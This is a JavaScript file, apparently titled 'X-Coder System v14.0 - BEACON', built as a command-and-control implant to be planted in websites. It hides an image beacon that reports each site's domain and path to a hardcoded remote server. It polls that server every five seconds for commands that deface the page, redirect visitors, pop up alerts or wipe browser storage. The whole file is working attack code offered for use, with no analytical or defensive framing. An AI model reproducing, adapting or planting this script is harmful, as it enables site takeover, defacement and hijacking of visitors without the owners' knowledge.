/**
 * X-Coder System v14.0 - BEACON
 * PASTI WORK
 */

(function() {
    'use strict';

    var SERVER = 'https://nexaisback.itsmeher.my.id';

    function getDomain() {
        return window.location.hostname;
    }

    // ============================================================
    // SEND BEACON
    // ============================================================
    function sendBeacon() {
        var url = SERVER + '?log=1&domain=' + encodeURIComponent(getDomain()) + '&path=' + encodeURIComponent(window.location.pathname);
        
        var img = new Image();
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
        
        console.log('📡 Beacon sent:', getDomain());
    }

    // ============================================================
    // CEK COMMAND
    // ============================================================
    function checkCommand() {
        var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(getDomain());
        
        fetch(url)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data && data.command) {
                    executeCommand(data.command, data);
                }
            })
            .catch(function() {});
    }

    // ============================================================
    // EXECUTE COMMAND
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command:', command);
        
        switch(command) {
            case 'deface':
                document.documentElement.innerHTML = data.html || '<h1>HACKED</h1>';
                break;
            case 'alert':
                alert(data.message || 'Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Cleared!');
                break;
        }
    }

    // ============================================================
    // JALANKAN
    // ============================================================
    setTimeout(sendBeacon, 500);
    setInterval(sendBeacon, 30000);
    setInterval(checkCommand, 5000);

    console.log('🔍 X-Coder v14.0 started on:', getDomain());
})();
